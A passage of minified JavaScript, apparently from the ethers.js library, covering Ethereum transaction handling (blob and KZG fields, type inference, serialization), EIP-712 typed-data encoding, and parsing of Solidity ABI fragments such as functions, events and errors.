maxFeePerBlobGas(){const e=A(this,Qa);return e==null&&this.type===3?Gt:e}set maxFeePerBlobGas(e){$(this,Qa,e==null?null:ge(e,"maxFeePerBlobGas"))}get blobVersionedHashes(){let e=A(this,yo);return e==null&&this.type===3?[]:e}set blobVersionedHashes(e){if(e!=null){M(Array.isArray(e),"blobVersionedHashes must be an Array","value",e),e=e.slice();for(let r=0;r<e.length;r++)M(gt(e[r],32),"invalid blobVersionedHash",`value[${r}]`,e[r])}$(this,yo,e)}get blobs(){return A(this,bo)==null?null:A(this,bo).map(e=>Object.assign({},e))}set blobs(e){if(e==null){$(this,bo,null);return}const r=[],n=[];for(let i=0;i<e.length;i++){const s=e[i];if(S2(s)){K(A(this,xs),"adding a raw blob requires a KZG library","UNSUPPORTED_OPERATION",{operation:"set blobs()"});let o=Ve(s);if(M(o.length<=km,"blob is too large",`blobs[${i}]`,s),o.length!==km){const l=new Uint8Array(km);l.set(o),o=l}const a=A(this,xs).blobToKzgCommitment(o),c=ue(A(this,xs).computeBlobKzgProof(o,a));r.push({data:ue(o),commitment:ue(a),proof:c}),n.push(y6(1,a))}else{const o=ue(s.commitment);r.push({data:ue(s.data),commitment:o,proof:ue(s.proof)}),n.push(y6(1,o))}}$(this,bo,r),$(this,yo,n)}get kzg(){return A(this,xs)}set kzg(e){$(this,xs,e)}get hash(){return this.signature==null?null:$t(Q(this,yu,F0).call(this,!0,!1))}get unsignedHash(){return $t(this.unsignedSerialized)}get from(){return this.signature==null?null:pte(this.unsignedHash,this.signature)}get fromPublicKey(){return this.signature==null?null:mf.recoverPublicKey(this.unsignedHash,this.signature)}isSigned(){return this.signature!=null}get serialized(){return Q(this,yu,F0).call(this,!0,!0)}get unsignedSerialized(){return Q(this,yu,F0).call(this,!1,!1)}inferType(){const e=this.inferTypes();return e.indexOf(2)>=0?2:e.pop()}inferTypes(){const e=this.gasPrice!=null,r=this.maxFeePerGas!=null||this.maxPriorityFeePerGas!=null,n=this.accessList!=null,i=A(this,Qa)!=null||A(this,yo);this.maxFeePerGas!=null&&this.maxPriorityFeePerGas!=null&&K(this.maxFeePerGas>=this.maxPriorityFeePerGas,"priorityFee cannot be more than maxFee","BAD_DATA",{value:this}),K(!r||this.type!==0&&this.type!==1,"transaction type cannot have maxFeePerGas or maxPriorityFeePerGas","BAD_DATA",{value:this}),K(this.type!==0||!n,"legacy transaction cannot have accessList","BAD_DATA",{value:this});const s=[];return this.type!=null?s.push(this.type):r?s.push(2):e?(s.push(1),n||s.push(0)):n?(s.push(1),s.push(2)):(i&&this.to||(s.push(0),s.push(1),s.push(2)),s.push(3)),s.sort(),s}isLegacy(){return this.type===0}isBerlin(){return this.type===1}isLondon(){return this.type===2}isCancun(){return this.type===3}clone(){return ws.from(this)}toJSON(){const e=r=>r==null?null:r.toString();return{type:this.type,to:this.to,data:this.data,nonce:this.nonce,gasLimit:e(this.gasLimit),gasPrice:e(this.gasPrice),maxPriorityFeePerGas:e(this.maxPriorityFeePerGas),maxFeePerGas:e(this.maxFeePerGas),value:e(this.value),chainId:e(this.chainId),sig:this.signature?this.signature.toJSON():null,accessList:this.accessList}}static from(e){if(e==null)return new ws;if(typeof e=="string"){const n=Ve(e);if(n[0]>=127)return ws.from(Ete(n));switch(n[0]){case 1:return ws.from(Ite(n));case 2:return ws.from(Ate(n));case 3:return ws.from(Nte(n))}K(!1,"unsupported transaction type","UNSUPPORTED_OPERATION",{operation:"from"})}const r=new ws;return e.type!=null&&(r.type=e.type),e.to!=null&&(r.to=e.to),e.nonce!=null&&(r.nonce=e.nonce),e.gasLimit!=null&&(r.gasLimit=e.gasLimit),e.gasPrice!=null&&(r.gasPrice=e.gasPrice),e.maxPriorityFeePerGas!=null&&(r.maxPriorityFeePerGas=e.maxPriorityFeePerGas),e.maxFeePerGas!=null&&(r.maxFeePerGas=e.maxFeePerGas),e.maxFeePerBlobGas!=null&&(r.maxFeePerBlobGas=e.maxFeePerBlobGas),e.data!=null&&(r.data=e.data),e.value!=null&&(r.value=e.value),e.chainId!=null&&(r.chainId=e.chainId),e.signature!=null&&(r.signature=fi.from(e.signature)),e.accessList!=null&&(r.accessList=e.accessList),e.blobVersionedHashes!=null&&(r.blobVersionedHashes=e.blobVersionedHashes),e.kzg!=null&&(r.kzg=e.kzg),e.blobs!=null&&(r.blobs=e.blobs),e.hash!=null&&(M(r.isSigned(),"unsigned transaction cannot define '.hash'","tx",e),M(r.hash===e.hash,"hash mismatch","tx",e)),e.from!=null&&(M(r.isSigned(),"unsigned transaction cannot define '.from'","tx",e),M(r.from.toLowerCase()===(e.from||"").toLowerCase(),"from mismatch","tx",e)),r}};Ti=new WeakMap,au=new WeakMap,cu=new WeakMap,lu=new WeakMap,uu=new WeakMap,hu=new WeakMap,du=new WeakMap,fu=new WeakMap,pu=new WeakMap,gu=new WeakMap,wu=new WeakMap,mu=new WeakMap,Qa=new WeakMap,yo=new WeakMap,xs=new WeakMap,bo=new WeakMap,yu=new WeakSet,F0=function(e,r){K(!e||this.signature!=null,"cannot serialize unsigned transaction; maybe you meant .unsignedSerialized","UNSUPPORTED_OPERATION",{operation:".serialized"});const n=e?this.signature:null;switch(this.inferType()){case 0:return Cte(this,n);case 1:return Ste(this,n);case 2:return xte(this,n);case 3:return Pte(this,n,r?this.blobs:null)}K(!1,"unsupported transaction type","UNSUPPORTED_OPERATION",{operation:".serialized"})};let Sg=ws;const l7=new Uint8Array(32);l7.fill(0);const kte=BigInt(-1),u7=BigInt(0),h7=BigInt(1),Ote=BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");function _te(t){const e=Ve(t),r=e.length%32;return r?Ot([e,l7.slice(r)]):ue(e)}const Tte=qo(h7,32),$te=qo(u7,32),b6={name:"string",version:"string",chainId:"uint256",verifyingContract:"address",salt:"bytes32"},Om=["name","version","chainId","verifyingContract","salt"];function v6(t){return function(e){return M(typeof e=="string",`invalid domain value for ${JSON.stringify(t)}`,`domain.${t}`,e),e}}const Rte={name:v6("name"),version:v6("version"),chainId:function(t){const e=ge(t,"domain.chainId");return M(e>=0,"invalid chain ID","domain.chainId",t),Number.isSafeInteger(e)?Number(e):Ul(e)},verifyingContract:function(t){try{return ot(t).toLowerCase()}catch{}M(!1,'invalid domain value "verifyingContract"',"domain.verifyingContract",t)},salt:function(t){const e=Ve(t,"domain.salt");return M(e.length===32,'invalid domain value "salt"',"domain.salt",t),ue(e)}};function _m(t){{const e=t.match(/^(u?)int(\d+)$/);if(e){const r=e[1]==="",n=parseInt(e[2]);M(n%8===0&&n!==0&&n<=256&&e[2]===String(n),"invalid numeric width","type",t);const i=Ba(Ote,r?n-1:n),s=r?(i+h7)*kte:u7;return function(o){const a=ge(o,"value");return M(a>=s&&a<=i,`value out-of-bounds for ${t}`,"value",a),qo(r?Y9(a,256):a,32)}}}{const e=t.match(/^bytes(\d+)$/);if(e){const r=parseInt(e[1]);return M(r!==0&&r<=32&&e[1]===String(r),"invalid bytes width","type",t),function(n){const i=Ve(n);return M(i.length===r,`invalid length for ${t}`,"value",n),_te(n)}}}switch(t){case"address":return function(e){return kc(ot(e),32)};case"bool":return function(e){return e?Tte:$te};case"bytes":return function(e){return $t(e)};case"string":return function(e){return _c(e)}}return null}function E6(t,e){return`${t}(${e.map(({name:r,type:n})=>n+" "+r).join(",")})`}function I0(t){const e=t.match(/^([^\x5b]*)((\x5b\d*\x5d)*)(\x5b(\d*)\x5d)$/);return e?{base:e[1],index:e[2]+e[4],array:{base:e[1],prefix:e[1]+e[2],count:e[5]?parseInt(e[5]):-1}}:{base:t}}var Pf,Is,bu,$g,d7;const $n=class $n{constructor(e){H(this,$g);j(this,"primaryType");H(this,Pf);H(this,Is);H(this,bu);$(this,Is,new Map),$(this,bu,new Map);const r=new Map,n=new Map,i=new Map,s={};Object.keys(e).forEach(c=>{s[c]=e[c].map(({name:l,type:u})=>{let{base:h,index:d}=I0(u);return h==="int"&&!e.int&&(h="int256"),h==="uint"&&!e.uint&&(h="uint256"),{name:l,type:h+(d||"")}}),r.set(c,new Set),n.set(c,[]),i.set(c,new Set)}),$(this,Pf,JSON.stringify(s));for(const c in s){const l=new Set;for(const u of s[c]){M(!l.has(u.name),`duplicate variable name ${JSON.stringify(u.name)} in ${JSON.stringify(c)}`,"types",e),l.add(u.name);const h=I0(u.type).base;M(h!==c,`circular type reference to ${JSON.stringify(h)}`,"types",e),!_m(h)&&(M(n.has(h),`unknown type ${JSON.stringify(h)}`,"types",e),n.get(h).push(c),r.get(c).add(h))}}const o=Array.from(n.keys()).filter(c=>n.get(c).length===0);M(o.length!==0,"missing primary type","types",e),M(o.length===1,`ambiguous primary types or unused types: ${o.map(c=>JSON.stringify(c)).join(", ")}`,"types",e),Ce(this,{primaryType:o[0]});function a(c,l){M(!l.has(c),`circular type reference to ${JSON.stringify(c)}`,"types",e),l.add(c);for(const u of r.get(c))if(n.has(u)){a(u,l);for(const h of l)i.get(h).add(u)}l.delete(c)}a(this.primaryType,new Set);for(const[c,l]of i){const u=Array.from(l);u.sort(),A(this,Is).set(c,E6(c,s[c])+u.map(h=>E6(h,s[h])).join(""))}}get types(){return JSON.parse(A(this,Pf))}getEncoder(e){let r=A(this,bu).get(e);return r||(r=Q(this,$g,d7).call(this,e),A(this,bu).set(e,r)),r}encodeType(e){const r=A(this,Is).get(e);return M(r,`unknown type: ${JSON.stringify(e)}`,"name",e),r}encodeData(e,r){return this.getEncoder(e)(r)}hashStruct(e,r){return $t(this.encodeData(e,r))}encode(e){return this.encodeData(this.primaryType,e)}hash(e){return this.hashStruct(this.primaryType,e)}_visit(e,r,n){if(_m(e))return n(e,r);const i=I0(e).array;if(i)return M(i.count===-1||i.count===r.length,`array length mismatch; expected length ${i.count}`,"value",r),r.map(o=>this._visit(i.prefix,o,n));const s=this.types[e];if(s)return s.reduce((o,{name:a,type:c})=>(o[a]=this._visit(c,r[a],n),o),{});M(!1,`unknown type: ${e}`,"type",e)}visit(e,r){return this._visit(this.primaryType,e,r)}static from(e){return new $n(e)}static getPrimaryType(e){return $n.from(e).primaryType}static hashStruct(e,r,n){return $n.from(r).hashStruct(e,n)}static hashDomain(e){const r=[];for(const n in e){if(e[n]==null)continue;const i=b6[n];M(i,`invalid typed-data domain key: ${JSON.stringify(n)}`,"domain",e),r.push({name:n,type:i})}return r.sort((n,i)=>Om.indexOf(n.name)-Om.indexOf(i.name)),$n.hashStruct("EIP712Domain",{EIP712Domain:r},e)}static encode(e,r,n){return Ot(["0x1901",$n.hashDomain(e),$n.from(r).hash(n)])}static hash(e,r,n){return $t($n.encode(e,r,n))}static async resolveNames(e,r,n,i){e=Object.assign({},e);for(const a in e)e[a]==null&&delete e[a];const s={};e.verifyingContract&&!gt(e.verifyingContract,20)&&(s[e.verifyingContract]="0x");const o=$n.from(r);o.visit(n,(a,c)=>(a==="address"&&!gt(c,20)&&(s[c]="0x"),c));for(const a in s)s[a]=await i(a);return e.verifyingContract&&s[e.verifyingContract]&&(e.verifyingContract=s[e.verifyingContract]),n=o.visit(n,(a,c)=>a==="address"&&s[c]?s[c]:c),{domain:e,value:n}}static getPayload(e,r,n){$n.hashDomain(e);const i={},s=[];Om.forEach(c=>{const l=e[c];l!=null&&(i[c]=Rte[c](l),s.push({name:c,type:b6[c]}))});const o=$n.from(r);r=o.types;const a=Object.assign({},r);return M(a.EIP712Domain==null,"types must not contain EIP712Domain type","types.EIP712Domain",r),a.EIP712Domain=s,o.encode(n),{types:a,domain:i,primaryType:o.primaryType,message:o.visit(n,(c,l)=>{if(c.match(/^bytes(\d*)/))return ue(Ve(l));if(c.match(/^u?int/))return ge(l).toString();switch(c){case"address":return l.toLowerCase();case"bool":return!!l;case"string":return M(typeof l=="string","invalid string","value",l),l}M(!1,"unsupported type","type",c)})}}};Pf=new WeakMap,Is=new WeakMap,bu=new WeakMap,$g=new WeakSet,d7=function(e){{const i=_m(e);if(i)return i}const r=I0(e).array;if(r){const i=r.prefix,s=this.getEncoder(i);return o=>{M(r.count===-1||r.count===o.length,`array length mismatch; expected length ${r.count}`,"value",o);let a=o.map(s);return A(this,Is).has(i)&&(a=a.map($t)),$t(Ot(a))}}const n=this.types[e];if(n){const i=_c(A(this,Is).get(e));return s=>{const o=n.map(({name:a,type:c})=>{const l=this.getEncoder(c)(s[a]);return A(this,Is).has(c)?$t(l):l});return o.unshift(i),Ot(o)}}M(!1,`unknown type: ${e}`,"type",e)};let Ng=$n;function Pr(t){const e=new Set;return t.forEach(r=>e.add(r)),Object.freeze(e)}const Dte="external public payable override",Bte=Pr(Dte.split(" ")),f7="constant external internal payable private public pure view override",Lte=Pr(f7.split(" ")),p7="constructor error event fallback function receive struct",g7=Pr(p7.split(" ")),w7="calldata memory storage payable indexed",Ute=Pr(w7.split(" ")),Mte="tuple returns",Fte=[p7,w7,Mte,f7].join(" "),zte=Pr(Fte.split(" ")),jte={"(":"OPEN_PAREN",")":"CLOSE_PAREN","[":"OPEN_BRACKET","]":"CLOSE_BRACKET",",":"COMMA","@":"AT"},Hte=new RegExp("^(\\s*)"),qte=new RegExp("^([0-9]+)"),Vte=new RegExp("^([a-zA-Z$_][a-zA-Z0-9$_]*)"),m7=new RegExp("^([a-zA-Z$_][a-zA-Z0-9$_]*)$"),y7=new RegExp("^(address|bool|bytes([0-9]*)|string|u?int([0-9]*))$");var rr,ai,kf,gb;const Rg=class Rg{constructor(e){H(this,kf);H(this,rr);H(this,ai);$(this,rr,0),$(this,ai,e.slice())}get offset(){return A(this,rr)}get length(){return A(this,ai).length-A(this,rr)}clone(){return new Rg(A(this,ai))}reset(){$(this,rr,0)}popKeyword(e){const r=this.peek();if(r.type!=="KEYWORD"||!e.has(r.text))throw new Error(`expected keyword ${r.text}`);return this.pop().text}popType(e){if(this.peek().type!==e){const r=this.peek();throw new Error(`expected ${e}; got ${r.type} ${JSON.stringify(r.text)}`)}return this.pop().text}popParen(){const e=this.peek();if(e.type!=="OPEN_PAREN")throw new Error("bad start");const r=Q(this,kf,gb).call(this,A(this,rr)+1,e.match+1);return $(this,rr,e.match+1),r}popParams(){const e=this.peek();if(e.type!=="OPEN_PAREN")throw new Error("bad start");const r=[];for(;A(this,rr)<e.match-1;){const n=this.peek().linkNext;r.push(Q(this,kf,gb).call(this,A(this,rr)+1,n)),$(this,rr,n)}return $(this,rr,e.match+1),r}peek(){if(A(this,rr)>=A(this,ai).length)throw new Error("out-of-bounds");return A(this,ai)[A(this,rr)]}peekKeyword(e){const r=this.peekType("KEYWORD");return r!=null&&e.has(r)?r:null}peekType(e){if(this.length===0)return null;const r=this.peek();return r.type===e?r.text:null}pop(){const e=this.peek();return mh(this,rr)._++,e}toString(){const e=[];for(let r=A(this,rr);r<A(this,ai).length;r++){const n=A(this,ai)[r];e.push(`${n.type}:${n.text}`)}return`<TokenString ${e.join(" ")}>`}};rr=new WeakMap,ai=new WeakMap,kf=new WeakSet,gb=function(e=0,r=0){return new Rg(A(this,ai).slice(e,r).map(n=>Object.freeze(Object.assign({},n,{match:n.match-e,linkBack:n.linkBack-e,linkNext:n.linkNext-e}))))};let pi=Rg;function Zo(t){const e=[],r=o=>{const a=s<t.length?JSON.stringify(t[s]):"$EOI";throw new Error(`invalid token ${a} at ${s}: ${o}`)};let n=[],i=[],s=0;for(;s<t.length;){let o=t.substring(s),a=o.match(Hte);a&&(s+=a[1].length,o=t.substring(s));const c={depth:n.length,linkBack:-1,linkNext:-1,match:-1,type:"",text:"",offset:s,value:-1};e.push(c);let l=jte[o[0]]||"";if(l){if(c.type=l,c.text=o[0],s++,l==="OPEN_PAREN")n.push(e.length-1),i.push(e.length-1);else if(l=="CLOSE_PAREN")n.length===0&&r("no matching open bracket"),c.match=n.pop(),e[c.match].match=e.length-1,c.depth--,c.linkBack=i.pop(),e[c.linkBack].linkNext=e.length-1;else if(l==="COMMA")c.linkBack=i.pop(),e[c.linkBack].linkNext=e.length-1,i.push(e.length-1);else if(l==="OPEN_BRACKET")c.type="BRACKET";else if(l==="CLOSE_BRACKET"){let u=e.pop().text;if(e.length>0&&e[e.length-1].type==="NUMBER"){const h=e.pop().text;u=h+u,e[e.length-1].value=Re(h)}if(e.length===0||e[e.length-1].type!=="BRACKET")throw new Error("missing opening bracket");e[e.length-1].text+=u}continue}if(a=o.match(Vte),a){if(c.text=a[1],s+=c.text.length,zte.has(c.text)){c.type="KEYWORD";continue}if(c.text.match(y7)){c.type="TYPE";continue}c.type="ID";continue}if(a=o.match(qte),a){c.text=a[1],c.type="NUMBER",s+=c.text.length;continue}throw new Error(`unexpected token ${JSON.stringify(o[0])} at position ${s}`)}return new pi(e.map(o=>Object.freeze(o)))}function C6(t,e){let r=[];for(const n in e.keys())t.has(n)&&r.push(n);if(r.length>1)throw new Error(`conflicting types: ${r.join(", ")}`)}function I1(t,e){if(e.peekKeyword(g7)){const r=e.pop().text;if(r!==t)throw new Error(`expected ${t}, got ${r}`)}return e.popType("ID")}function qs(t,e){const r=new Set;for(;;){const n=t.peekType("KEYWORD");if(n==null||e&&!e.has(n))break;if(t.pop(),r.has(n))throw new Error(`duplicate keywords: ${JSON.stringify(n)}`);r.add(n)}return Object.freeze(r)}function b7(t){let e=qs(t,Lte);return C6(e,Pr("constant payable nonpayable".split(" "))),C6(e,Pr("pure view payable nonpayable".split(" "))),e.has("view")?"view":e.has("pure")?"pure":e.has("payable")?"payable":e.has("nonpayable")?"nonpayable":e.has("constant")?"view":"nonpayable"}function zs(t,e){return t.popParams().map(r=>ar.from(r,e))}function v7(t){if(t.peekType("AT")){if(t.pop(),t.peekType("NUMBER"))return ge(t.pop().text);throw new Error("invalid gas")}return null}function Tc(t){if(t.length)throw new Error(`unexpected tokens at offset ${t.offset}: ${t.toString()}`)}const Wte=new RegExp(/^(.*)\[([0-9]*)\]$/);function A6(t){const e=t.match(y7);if(M(e,"invalid type","type",t),t==="uint")return"uint256";if(t==="int")return"int256";if(e[2]){const r=parseInt(e[2]);M(r!==0&&r<=32,"invalid bytes length","type",t)}else if(e[3]){const r=parseInt(e[3]);M(r!==0&&r<=256&&r%8===0,"invalid numeric width","type",t)}return t}const vt={},Zr=Symbol.for("_ethers_internal"),x6="_ParamTypeInternal",I6="_ErrorInternal",S6="_EventInternal",N6="_ConstructorInternal",P6="_FallbackInternal",k6="_FunctionInternal",O6="_StructInternal";var vu,z0;const Rn=class Rn{constructor(e,r,n,i,s,o,a,c){H(this,vu);j(this,"name");j(this,"type");j(this,"baseType");j(this,"indexed");j(this,"components");j(this,"arrayLength");j(this,"arrayChildren");if(sp(e,vt,"ParamType"),Object.defineProperty(this,Zr,{value:x6}),o&&(o=Object.freeze(o.slice())),i==="array"){if(a==null||c==null)throw new Error("")}else if(a!=null||c!=null)throw new Error("");if(i==="tuple"){if(o==null)throw new Error("")}else if(o!=null)throw new Error("");Ce(this,{name:r,type:n,baseType:i,indexed:s,components:o,arrayLength:a,arrayChildren:c})}format(e){if(e==null&&(e="sighash"),e==="json"){const n=this.name||"";if(this.isArray()){const s=JSON.parse(this.arrayChildren.format("json"));return s.name=n,s.type+=`[${this.arrayLength<0?"":String(this.arrayLength)}]`,JSON.stringify(s)}const i={type:this.baseType==="tuple"?"tuple":this.type,name:n};return typeof this.indexed=="boolean"&&(i.indexed=this.indexed),this.isTuple()&&(i.components=this.components.map(s=>JSON.parse(s.format(e)))),JSON.stringify(i)}let r="";return this.isArray()?(r+=this.arrayChildren.format(e),r+=`[${this.arrayLength<0?"":String(this.arrayLength)}]`):this.isTuple()?r+="("+this.components.map(n=>n.format(e)).join(e==="full"?", ":",")+")":r+=this.type,e!=="sighash"&&(this.indexed===!0&&(r+=" indexed"),e==="full"&&this.name&&(r+=" "+this.name)),r}isArray(){return this.baseType==="array"}isTuple(){return this.baseType==="tuple"}isIndexable(){return this.indexed!=null}walk(e,r){if(this.isArray()){if(!Array.isArray(e))throw new Error("invalid array value");if(this.arrayLength!==-1&&e.length!==this.arrayLength)throw new Error("array is wrong length");const n=this;return e.map(i=>n.arrayChildren.walk(i,r))}if(this.isTuple()){if(!Array.isArray(e))throw new Error("invalid tuple value");if(e.length!==this.components.length)throw new Error("array is wrong length");const n=this;return e.map((i,s)=>n.components[s].walk(i,r))}return r(this.type,e)}async walkAsync(e,r){const n=[],i=[e];return Q(this,vu,z0).call(this,n,e,r,s=>{i[0]=s}),n.length&&await Promise.all(n),i[0]}static from(e,r){if(Rn.isParamType(e))return e;if(typeof e=="string")try{return Rn.from(Zo(e),r)}catch{M(!1,"invalid param type","obj",e)}else if(e instanceof pi){let a="",c="",l=null;qs(e,Pr(["tuple"])).has("tuple")||e.peekType("OPEN_PAREN")?(c="tuple",l=e.popParams().map(p=>Rn.from(p)),a=`tuple(${l.map(p=>p.format()).join(",")})`):(a=A6(e.popType("TYPE")),c=a);let u=null,h=null;for(;e.length&&e.peekType("BRACKET");){const p=e.pop();u=new Rn(vt,"",a,c,null,l,h,u),h=p.value,a+=p.text,c="array",l=null}let d=null;if(qs(e,Ute).has("indexed")){if(!r)throw new Error("");d=!0}const g=e.peekType("ID")?e.pop().text:"";if(e.length)throw new Error("leftover tokens");return new Rn(vt,g,a,c,d,l,h,u)}const n=e.name;M(!n||typeof n=="string"&&n.match(m7),"invalid name","obj.name",n);let i=e.indexed;i!=null&&(M(r,"parameter cannot be indexed","obj.indexed",e.indexed),i=!!i);let s=e.type,o=s.match(Wte);if(o){const a=parseInt(o[2]||"-1"),c=Rn.from({type:o[1],components:e.components});return new Rn(vt,n||"",s,"array",i,null,a,c)}if(s==="tuple"||s.startsWith("tuple(")||s.startsWith("(")){const a=e.components!=null?e.components.map(l=>Rn.from(l)):null;return new Rn(vt,n||"",s,"tuple",i,a,null,null)}return s=A6(e.type),new Rn(vt,n||"",s,s,i,null,null,null)}static isParamType(e){return e&&e[Zr]===x6}};vu=new WeakSet,z0=function(e,r,n,i){if(this.isArray()){if(!Array.isArray(r))throw new Error("invalid array value");if(this.arrayLength!==-1&&r.length!==this.arrayLength)throw new Error("array is wrong length");const o=this.arrayChildren,a=r.slice();a.forEach((c,l)=>{var u;Q(u=o,vu,z0).call(u,e,c,n,h=>{a[l]=h})}),i(a);return}if(this.isTuple()){const o=this.components;let a;if(Array.isArray(r))a=r.slice();else{if(r==null||typeof r!="object")throw new Error("invalid tuple value");a=o.map(c=>{if(!c.name)throw new Error("cannot use object value with unnamed components");if(!(c.name in r))throw new Error(`missing value for component ${c.name}`);return r[c.name]})}if(a.length!==this.components.length)throw new Error("array is wrong length");a.forEach((c,l)=>{var u;Q(u=o[l],vu,z0).call(u,e,c,n,h=>{a[l]=h})}),i(a);return}const s=n(this.type,r);s.then?e.push(async function(){i(await s)}()):i(s)};let ar=Rn;class $c{constructor(e,r,n){j(this,"type");j(this,"inputs");sp(e,vt,"Fragment"),n=Object.freeze(n.slice()),Ce(this,{type:r,inputs:n})}static from(e){if(typeof e=="string"){try{$c.from(JSON.parse(e))}catch{}return $c.from(Zo(e))}if(e instanceof pi)switch(e.peekKeyword(g7)){case"constructor":return Ds.from(e);case"error":return Gr.from(e);case"event":return Hi.from(e);case"fallback":case"receive":return bs.from(e);case"function":return qi.from(e);case"struct":return pc.from(e)}else if(typeof e=="object"){switch(e.type){case"constructor":return Ds.from(e);case"error":return Gr.from(e);case"event":return Hi.from(e);case"fallback":case"receive":return bs.from(e);case"function":return qi.from(e);case"struct":return pc.from(e)}K(!1,`unsupported type: ${e.type}`,"UNSUPPORTED_OPERATION",{operation:"Fragment.from"})}M(!1,"unsupported frgament object","obj",e)}static isConstructor(e){return Ds.isFragment(e)}static isError(e){return Gr.isFragment(e)}static isEvent(e){return Hi.isFragment(e)}static isFunction(e){return qi.isFragment(e)}static isStruct(e){return pc.isFragment(e)}}class S1 extends $c{constructor(r,n,i,s){super(r,n,s);j(this,"name");M(typeof i=="string"&&i.match(m7),"invalid identifier","name",i),s=Object.freeze(s.slice()),Ce(this,{name:i})}}function Cf(t,e){return"("+e.map(r=>r.format(t)).join(t==="full"?", ":",")+")"}class Gr extends S1{constructor(e,r,n){super(e,"error",r,n),Object.defineProperty(this,Zr,{value:I6})}get selector(){return _c(this.format("sighash")).substring(0,10)}format(e){if(e==null&&(e="sighash"),e==="json")return JSON.stringify({type:"error",name:this.name,inputs:this.inputs.map(n=>JSON.parse(n.format(e)))});const r=[];return e!=="sighash"&&r.push("error"),r.push(this.name+Cf(e,this.inputs)),r.join(" ")}static from(e){if(Gr.isFragment(e))return e;if(typeof e=="string")return Gr.from(Zo(e));if(e instanceof pi){const r=I1("error",e),n=zs(e);return Tc(e),new Gr(vt,r,n)}return new Gr(vt,e.name,e.inputs?e.inputs.map(ar.from):[])}static isFragment(e){return e&&e[Zr]===I6}}class Hi extends S1{constructor(r,n,i,s){super(r,"event",n,i);j(this,"anonymous");Object.defineProperty(this,Zr,{value:S6}),Ce(this,{anonymous:s})}get topicHash(){return _c(this.format("sighash"))}format(r){if(r==null&&(r="sighash"),r==="json")return JSON.stringify({type:"event",anonymous:this.anonymous,name:this.name,inputs:this.inputs.map(i=>JSON.parse(i.format(r)))});const n=[];return r!=="sighash"&&n.push("event"),n.push(this.name+Cf(r,this.inputs)),r!=="sighash"&&this.anonymous&&n.push("anonymous"),n.join(" ")}static getTopicHash(r,n){return n=(n||[]).map(s=>ar.from(s)),new Hi(vt,r,n,!1).topicHash}static from(r){if(Hi.isFragment(r))return r;if(typeof r=="string")try{return Hi.from(Zo(r))}catch{M(!1,"invalid event fragment","obj",r)}else if(r instanceof pi){const n=I1("event",r),i=zs(r,!0),s=!!qs(r,Pr(["anonymous"])).has("anonymous");return Tc(r),new Hi(vt,n,i,s)}return new Hi(vt,r.name,r.inputs?r.inputs.map(n=>ar.from(n,!0)):[],!!r.anonymous)}static isFragment(r){return r&&r[Zr]===S6}}class Ds extends $c{constructor(r,n,i,s,o){super(r,n,i);j(this,"payable");j(this,"gas");Object.defineProperty(this,Zr,{value:N6}),Ce(this,{payable:s,gas:o})}format(r){if(K(r!=null&&r!=="sighash","cannot format a constructor for sighash","UNSUPPORTED_OPERATION",{operation:"format(sighash)"}),r==="json")return JSON.stringify({type:"constructor",stateMutability:this.payable?"payable":"undefined",payable:this.payable,gas:this.gas!=null?this.gas:void 0,inputs:this.inputs.map(i=>JSON.parse(i.format(r)))});const n=[`constructor${Cf(r,this.inputs)}`];return this.payable&&n.push("payable"),this.gas!=null&&n.push(`@${this.gas.toString()}`),n.join(" ")}static from(r){if(Ds.isFragment(r))return r;if(typeof r=="string")try{return Ds.from(Zo(r))}catch{M(!1,"invalid constuctor fragment","obj",r)}else if(r instanceof pi){qs(r,Pr(["constructor"]));const n=zs(r),i=!!qs(r,Bte).has("payable"),s=v7(r);return Tc(r),new Ds(vt,"constructor",n,i,s)}return new Ds(vt,"constructor",r.inputs?r.inputs.map(ar.from):[],!!r.payable,r.gas!=null?r.gas:null)}static isFragment(r){return r&&r[Zr]===N6}}class bs extends $c{constructor(r,n,i){super(r,"fallback",n);j(this,"payable");Object.defineProperty(this,Zr,{value:P6}),Ce(this,{payable:i})}format(r){const n=this.inputs.length===0?"receive":"fallback";if(r==="json"){const i=this.payable?"payable":"nonpayable";return JSON.stringify({type:n,stateMutability:i})}return`${n}()${this.payable?" payable":""}`}static from(r){if(bs.isFragment(r))return r;if(typeof r=="string")try{return bs.from(Zo(r))}catch{M(!1,"invalid fallback fragment","obj",r)}else if(r instanceof pi){const n=r.toString(),i=r.peekKeyword(Pr(["fallback","receive"]));if(M(i,"type must be fallback or receive","obj",n),r.popKeyword(Pr(["fallback","receive"]))==="receive"){const c=zs(r);return M(c.length===0,"receive cannot have arguments","obj.inputs",c),qs(r,Pr(["payable"])),Tc(r),new bs(vt,[],!0)}let o=zs(r);o.length?M(o.length===1&&o[0].type==="bytes","invalid fallback inputs","obj.inputs",o.map(c=>c.format("minimal")).join(", ")):o=[ar.from("bytes")];const a=b7(r);if(M(a==="nonpayable"||a==="payable","fallback cannot be constants","obj.stateMutability",a),qs(r,Pr(["returns"])).has("returns")){const c=zs(r);M(c.length===1&&c[0].type==="bytes","invalid fallback outputs","obj.outputs",c.map(l=>l.format("minimal")).join(", "))}return Tc(r),new bs(vt,o,a==="payable")}if(r.type==="receive")return new bs(vt,[],!0);if(r.type==="fallback"){const n=[ar.from("bytes")],i=r.stateMutability==="payable";return new bs(vt,n,i)}M(!1,"invalid fallback description","obj",r)}static isFragment(r){return r&&r[Zr]===P6}}class qi extends S1{constructor(r,n,i,s,o,a){super(r,"function",n,s);j(this,"constant");j(this,"outputs");j(this,"stateMutability");j(this,"payable");j(this,"gas");Object.defineProperty(this,Zr,{value:k6}),o=Object.freeze(o.slice()),Ce(this,{constant:i==="view"||i==="pure",gas:a,outputs:o,payable:i==="payable",stateMutability:i})}get selector(){return _c(this.format("sighash")).substring(0,10)}format(r){if(r==null&&(r="sighash"),r==="json")return JSON.stringify({type:"function",name:this.name,constant:this.constant,stateMutability:this.stateMutability!=="nonpayable"?this.stateMutability:void 0,payable:this.payable,gas:this.gas!=null?this.gas:void 0,inputs:this.inputs.map(i=>JSON.parse(i.format(r))),outputs:this.outputs.map(i=>JSON.parse(i.format(r)))});const n=[];return r!=="sighash"&&n.push("function"),n.push(this.name+Cf(r,this.inputs)),r!=="sighash"&&(this.stateMutability!=="nonpayable"&&n.push(this.stateMutability),this.outputs&&this.outputs.length&&(n.push("returns"),n.push(Cf(r,this.outputs))),this.gas!=null&&n.push(`@${this.gas.toString()}`)),n.join(" ")}static getSelector(r,n){return n=(n||[]).map(s=>ar.from(s)),new qi(vt,r,"view",n,[],null).selector}static from(r){if(qi.isFragment(r))return r;if(typeof r=="string")try{return qi.from(Zo(r))}catch{M(!1,"invalid function fragment","obj",r)}else 